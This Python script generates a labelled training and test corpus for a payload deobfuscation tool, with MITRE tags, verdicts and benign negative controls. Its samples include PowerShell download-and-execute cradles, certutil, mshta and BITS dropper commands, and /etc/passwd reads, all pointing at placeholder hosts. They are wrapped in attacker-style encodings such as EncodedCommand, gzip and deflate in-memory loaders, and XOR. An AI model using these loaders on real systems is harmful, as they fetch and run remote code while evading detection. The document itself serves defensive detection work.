"""NivX Forge Training Corpus Generator (Feb 2026, v1 = 10 categories).

Deterministically produces a JSONL corpus + companion fixture pairs for
regression testing. Every sample carries a full ground-truth record:

    {
      "id":               "<category>_<idx>",
      "category":         "<category-slug>",
      "input":            "<obfuscated / encoded payload>",
      "expected_decoded": "<plaintext the decoder must recover>",
      "chain_stages":     [{"op": "...", "output_preview": "..."}],
      "iocs":             {"urls": [...], "domains": [...], "ips": [...]},
      "mitre":            [{"id": "T1059.001", "tactic": "execution"}],
      "lolbas":           ["powershell"],
      "verdict":          "Malicious" | "Suspicious" | "Benign",
      "confidence":       0..100,
      "notes":            "<one-line SOC context>"
    }

Regenerate the whole corpus:

    python -m training.corpus.generator

All C2 endpoints use SAFE example.com / defanged domains. Nothing in this
corpus can be executed against a live network.
"""
from __future__ import annotations
import base64
import binascii
import codecs
import gzip
import json
import os
import zlib
from typing import Any, Dict, List, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
FIXTURES_DIR = os.path.abspath(os.path.join(HERE, "..", "..", "tests", "fixtures"))
SAMPLES_JSONL = os.path.join(HERE, "samples.jsonl")
NEGATIVE_JSONL = os.path.join(HERE, "negative_samples.jsonl")

# ─── MITRE / LOLBAS presets ────────────────────────────────────────────
MITRE_PS_IEX      = {"id": "T1059.001", "tactic": "execution",   "technique": "PowerShell"}
MITRE_INGRESS     = {"id": "T1105",     "tactic": "command-and-control", "technique": "Ingress Tool Transfer"}
MITRE_OBFUS       = {"id": "T1027",     "tactic": "defense-evasion", "technique": "Obfuscated Files or Information"}
MITRE_CMD         = {"id": "T1059.003", "tactic": "execution", "technique": "Windows Command Shell"}

# ─── Helpers ────────────────────────────────────────────────────────────
def _xor(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def _sample(category: str, idx: int, inp: str, expected: str, chain: List[str],
            iocs: Dict[str, Any], mitre: List[Dict[str, Any]], lolbas: List[str],
            verdict: str, confidence: int, notes: str = "") -> Dict[str, Any]:
    return {
        "id": f"{category}_{idx:03d}",
        "category": category,
        "input": inp,
        "expected_decoded": expected,
        "chain_stages": [{"op": op, "output_preview": ""} for op in chain],
        "iocs": iocs,
        "mitre": mitre,
        "lolbas": lolbas,
        "verdict": verdict,
        "confidence": confidence,
        "notes": notes,
    }


# ─── Category 01 · base64_utf16le (PowerShell -EncodedCommand) ─────────
def cat_base64_utf16le() -> List[Dict[str, Any]]:
    plaintexts = [
        ("Write-Host 'benign hello'", "Benign", 40),
        ("IEX (New-Object Net.WebClient).DownloadString('http://benign1.example/x.ps1')", "Malicious", 85),
        ("IEX (iwr -useb 'http://benign2.example/loader.ps1')", "Malicious", 85),
        ("Start-BitsTransfer -Source 'http://benign3.example/t.exe' -Dest $env:TEMP\\t.exe", "Malicious", 85),
        ("Invoke-RestMethod 'http://benign4.example/api' -Method POST", "Suspicious", 70),
    ]
    out = []
    for i, (pt, verdict, conf) in enumerate(plaintexts, 1):
        enc = base64.b64encode(pt.encode("utf-16-le")).decode()
        inp = f"powershell.exe -EncodedCommand {enc}"
        iocs = {"urls": [u for u in [
            "http://benign1.example/x.ps1" if "benign1" in pt else None,
            "http://benign2.example/loader.ps1" if "benign2" in pt else None,
            "http://benign3.example/t.exe" if "benign3" in pt else None,
            "http://benign4.example/api" if "benign4" in pt else None,
        ] if u]}
        out.append(_sample("base64_utf16le", i, inp, pt,
            ["base64-decode", "utf16-le-decode"],
            iocs, [MITRE_PS_IEX, MITRE_OBFUS] if verdict != "Benign" else [MITRE_PS_IEX],
            ["powershell"], verdict, conf,
            "Standard PS -EncodedCommand UTF-16LE Base64 loader"))
    return out


# ─── Category 02 · double_base64 ───────────────────────────────────────
def cat_double_base64() -> List[Dict[str, Any]]:
    plaintexts = [
        "id",
        "whoami /priv",
        "type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
        "curl http://c2-example.test/beacon",
    ]
    out = []
    for i, pt in enumerate(plaintexts, 1):
        first = base64.b64encode(pt.encode()).decode()
        second = base64.b64encode(first.encode()).decode()
        iocs = {"urls": ["http://c2-example.test/beacon"]} if "c2-example" in pt else {}
        verdict = "Malicious" if "c2-example" in pt else ("Suspicious" if "reg query" in pt else "Benign")
        conf = 80 if verdict == "Malicious" else (55 if verdict == "Suspicious" else 30)
        out.append(_sample("double_base64", i, second, pt,
            ["base64-decode", "base64-decode"], iocs,
            [MITRE_OBFUS], ["cmd" if "reg query" in pt else "curl"] if "c2" in pt or "reg" in pt else [],
            verdict, conf, "Nested Base64 (2 layers)"))
    return out


# ─── Category 03 · gzip_base64 (PS IO.Compression.GzipStream) ──────────
def cat_gzip_base64() -> List[Dict[str, Any]]:
    plaintexts = [
        "IEX 'harmless'",
        "IEX (New-Object Net.WebClient).DownloadString('http://gz1-example.test/a.ps1')",
        "Start-BitsTransfer -Source 'http://gz2-example.test/dropper.exe' -Dest .",
        "Invoke-WebRequest -Uri 'http://gz3-example.test/beacon' -Method GET",
        "curl -s http://gz4-example.test/loader | iex",
    ]
    out = []
    for i, pt in enumerate(plaintexts, 1):
        gz = gzip.compress(pt.encode())
        enc = base64.b64encode(gz).decode()
        inp = (
            "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('" + enc + "'));"
            "IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream("
            "$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url.strip("'")]} if url else {}
        verdict = "Malicious" if url else "Benign"
        conf = 88 if verdict == "Malicious" else 35
        out.append(_sample("gzip_base64", i, inp, pt,
            ["extract-b64", "base64-gzip"], iocs,
            [MITRE_PS_IEX, MITRE_OBFUS] if url else [MITRE_PS_IEX],
            ["powershell"], verdict, conf,
            "PS IO.Compression.GzipStream in-memory loader"))
    return out


# ─── Category 04 · deflate_base64 (PS DeflateStream) ───────────────────
def cat_deflate_base64() -> List[Dict[str, Any]]:
    plaintexts = [
        "Write-Host 'testing deflate'",
        "IEX (iwr 'http://df1-example.test/x.ps1' -useb)",
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://df2-example.test/l.ps1')",
        "certutil.exe -urlcache -f http://df3-example.test/dropper.exe dropper.exe",
        "$c=New-Object Net.WebClient; $c.DownloadFile('http://df4-example.test/p.exe','p.exe')",
    ]
    out = []
    for i, pt in enumerate(plaintexts, 1):
        dfl = zlib.compress(pt.encode())[2:-4]     # raw deflate
        enc = base64.b64encode(dfl).decode()
        inp = (
            "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('" + enc + "'));"
            "IEX (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream("
            "$s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
        )
        url = next((s.strip("'").rstrip(")") for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else "Benign"
        conf = 88 if verdict == "Malicious" else 35
        lb = ["certutil"] if "certutil" in pt else (["powershell"] if verdict == "Malicious" else [])
        out.append(_sample("deflate_base64", i, inp, pt,
            ["extract-b64", "base64-deflate"], iocs,
            [MITRE_PS_IEX, MITRE_OBFUS] if url else [MITRE_PS_IEX],
            lb, verdict, conf,
            "PS IO.Compression.DeflateStream in-memory loader"))
    return out


# ─── Category 05 · xor_ascii_decimal_iex (Hancitor-shape) ──────────────
def cat_xor_ascii_decimal_iex() -> List[Dict[str, Any]]:
    plaintexts = [
        ("Write-Host 'safe'", 0x11),
        ("IEX (iwr 'http://xr1-example.test/x.ps1' -useb)", 0x2A),
        ("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://xr2-example.test/l.ps1')", 0x36),
        ("cmd /c mshta http://xr3-example.test/e.hta", 0x55),
        ("certutil -urlcache -f http://xr4-example.test/dropper dropper.exe", 0x77),
    ]
    out = []
    for i, (pt, key) in enumerate(plaintexts, 1):
        codes = ",".join(str(ord(c) ^ key) for c in pt)
        inp = (
            f"powershell -nop -w hidden \"(({codes}) | "
            f"ForEach-Object{{[char]($_ -bxor '0x{key:02x}')}}) -join '' | iex\""
        )
        url = next((s.strip("'\"") for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else "Benign"
        conf = 100 if verdict == "Malicious" else 40
        lolbas = ["mshta"] if "mshta" in pt else (["certutil"] if "certutil" in pt else ["powershell"])
        out.append(_sample("xor_ascii_decimal_iex", i, inp, pt,
            ["ascii-decimal-decode", "xor"], iocs,
            [MITRE_PS_IEX, MITRE_OBFUS],
            lolbas, verdict, conf,
            f"ASCII-decimal + XOR 0x{key:02x} + IEX (Hancitor-shape)"))
    return out


# ─── Category 06 · xor_base64 ──────────────────────────────────────────
def cat_xor_base64() -> List[Dict[str, Any]]:
    plaintexts = [
        ("id;whoami", 0x1F),
        ("IEX 'harmless test'", 0x33),
        ("curl http://xb1-example.test/beacon", 0x44),
        ("wget http://xb2-example.test/dropper -O /tmp/d", 0x66),
        ("mshta http://xb3-example.test/x.hta", 0x77),
    ]
    out = []
    for i, (pt, key) in enumerate(plaintexts, 1):
        xored = _xor(pt.encode(), key)
        enc = base64.b64encode(xored).decode()
        # Simplified wrapper (analyst sees the b64 blob + XOR hint)
        inp = f"$b='{enc}'; # xor-key 0x{key:02x}"
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else ("Suspicious" if "whoami" in pt else "Benign")
        conf = 80 if verdict == "Malicious" else (50 if verdict == "Suspicious" else 30)
        lb = ["mshta"] if "mshta" in pt else (["curl"] if "curl" in pt else (["wget"] if "wget" in pt else []))
        out.append(_sample("xor_base64", i, inp, pt,
            ["base64-decode", "xor"], iocs,
            [MITRE_OBFUS] if verdict != "Benign" else [],
            lb, verdict, conf, f"Base64 → XOR 0x{key:02x}"))
    return out


# ─── Category 07 · hex_bytes ───────────────────────────────────────────
def cat_hex_bytes() -> List[Dict[str, Any]]:
    plaintexts = [
        "Hello, World!",
        "id;whoami",
        "IEX 'harmless'",
        "curl http://hx1-example.test/x",
        "mshta http://hx2-example.test/y.hta",
    ]
    out = []
    for i, pt in enumerate(plaintexts, 1):
        inp = pt.encode().hex()
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else "Benign"
        conf = 75 if verdict == "Malicious" else 30
        lb = ["mshta"] if "mshta" in pt else (["curl"] if "curl" in pt else [])
        out.append(_sample("hex_bytes", i, inp, pt,
            ["hex-decode"], iocs, [MITRE_OBFUS] if verdict != "Benign" else [],
            lb, verdict, conf, "Raw hex-encoded bytes"))
    return out


# ─── Category 08 · decimal_ascii ───────────────────────────────────────
def cat_decimal_ascii() -> List[Dict[str, Any]]:
    plaintexts = [
        "id;whoami;hostname",
        "cat /etc/passwd",
        "Get-Process | Where-Object Name -eq notepad",
        "Invoke-Expression 'benign'",
        "curl http://dec1-example.test/x",
    ]
    out = []
    for i, pt in enumerate(plaintexts, 1):
        inp = ",".join(str(ord(c)) for c in pt)
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else ("Suspicious" if "passwd" in pt or "whoami" in pt else "Benign")
        conf = 75 if verdict == "Malicious" else (55 if verdict == "Suspicious" else 30)
        out.append(_sample("decimal_ascii", i, inp, pt,
            ["ascii-decimal-decode"], iocs,
            [MITRE_OBFUS] if verdict != "Benign" else [],
            ["powershell"] if "Invoke" in pt else (["curl"] if "curl" in pt else []),
            verdict, conf, "Raw comma-separated ASCII-decimal stream"))
    return out


# ─── Category 09 · base32_rfc4648 ──────────────────────────────────────
def cat_base32_rfc4648() -> List[Dict[str, Any]]:
    plaintexts = [
        "hello world",
        "id;whoami",
        "IEX 'test-benign'",
        "curl http://b32-example.test/x",
        "certutil -urlcache -f http://b32d-example.test/dropper dropper.exe",
    ]
    out = []
    for i, pt in enumerate(plaintexts, 1):
        inp = base64.b32encode(pt.encode()).decode()
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else "Benign"
        conf = 75 if verdict == "Malicious" else 40
        lb = ["certutil"] if "certutil" in pt else (["curl"] if "curl" in pt else [])
        out.append(_sample("base32_rfc4648", i, inp, pt,
            ["base32-decode"], iocs, [MITRE_OBFUS] if verdict != "Benign" else [],
            lb, verdict, conf, "RFC 4648 Base32 encoded payload"))
    return out


# ─── Category 10 · rot13 ───────────────────────────────────────────────
def cat_rot13() -> List[Dict[str, Any]]:
    plaintexts = [
        "Hello, this is a benign test",
        "Invoke-Expression 'safe payload'",
        "id;whoami;hostname",
        "curl http://rot-example.test/x",
        "IEX 'ClickFix fake CAPTCHA copypaste'",
    ]
    out = []
    for i, pt in enumerate(plaintexts, 1):
        inp = codecs.encode(pt, "rot_13")
        url = next((s for s in pt.split() if s.startswith("http")), None)
        iocs = {"urls": [url]} if url else {}
        verdict = "Malicious" if url else ("Suspicious" if "IEX" in pt or "Invoke" in pt else "Benign")
        conf = 70 if verdict == "Malicious" else (50 if verdict == "Suspicious" else 30)
        out.append(_sample("rot13", i, inp, pt,
            ["rot13"], iocs, [MITRE_OBFUS] if verdict != "Benign" else [],
            ["powershell"] if "Invoke" in pt or "IEX" in pt else (["curl"] if "curl" in pt else []),
            verdict, conf, "ROT13 substitution"))
    return out


# ─── Negative corpus (must NOT be flagged as malicious) ────────────────
def negative_corpus() -> List[Dict[str, Any]]:
    """Benign strings the decoder MUST NOT tag as malicious."""
    samples = [
        ("Hello, world!", "hello_plaintext"),
        ("SELECT id, name FROM users WHERE active = 1;", "sql_query"),
        ("The quick brown fox jumps over the lazy dog.", "pangram"),
        ("2025-02-14T12:34:56Z INFO service started", "log_line"),
        ("git commit -m 'Initial commit'", "git_command"),
        ("cat /var/log/syslog | grep ERROR | wc -l", "shell_pipeline"),
        ("import numpy as np\ndata = np.zeros((10, 10))", "python_snippet"),
        ("<html><body><h1>Welcome</h1></body></html>", "html_snippet"),
        ("192.168.1.1 is on the LAN — safe internal address", "internal_ip"),
        ("email me at john.doe@example.com if you have questions", "benign_email"),
    ]
    out = []
    for i, (s, tag) in enumerate(samples, 1):
        out.append({
            "id": f"negative_{i:03d}",
            "category": "negative",
            "input": s,
            "expected_decoded": s,      # no transformation expected
            "chain_stages": [],
            "iocs": {},
            "mitre": [],
            "lolbas": [],
            "verdict": "Benign",
            "confidence": 20,
            "notes": f"Negative control — {tag}",
        })
    return out


# ─── Assembly ──────────────────────────────────────────────────────────
CATEGORIES = [
    cat_base64_utf16le,
    cat_double_base64,
    cat_gzip_base64,
    cat_deflate_base64,
    cat_xor_ascii_decimal_iex,
    cat_xor_base64,
    cat_hex_bytes,
    cat_decimal_ascii,
    cat_base32_rfc4648,
    cat_rot13,
]


def build() -> Tuple[List[Dict[str, Any]], List[Dict[str, Any]]]:
    samples: List[Dict[str, Any]] = []
    for fn in CATEGORIES:
        samples.extend(fn())
    negatives = negative_corpus()
    return samples, negatives


def _mirror_fixtures(samples: List[Dict[str, Any]]) -> None:
    """Mirror each sample as a <stem>.txt / <stem>.expected.txt fixture pair."""
    os.makedirs(FIXTURES_DIR, exist_ok=True)
    for s in samples:
        stem = f"corpus_{s['id']}"
        with open(os.path.join(FIXTURES_DIR, stem + ".txt"), "w") as f:
            f.write(s["input"])
        with open(os.path.join(FIXTURES_DIR, stem + ".expected.txt"), "w") as f:
            f.write(s["expected_decoded"])


def main() -> None:
    samples, negatives = build()
    with open(SAMPLES_JSONL, "w") as f:
        for s in samples:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")
    with open(NEGATIVE_JSONL, "w") as f:
        for s in negatives:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")
    _mirror_fixtures(samples)
    print(f"[OK] wrote {len(samples)} samples across {len(CATEGORIES)} categories")
    print(f"[OK] wrote {len(negatives)} negative controls")
    print(f"[OK] fixtures mirrored to {FIXTURES_DIR}")


if __name__ == "__main__":
    main()
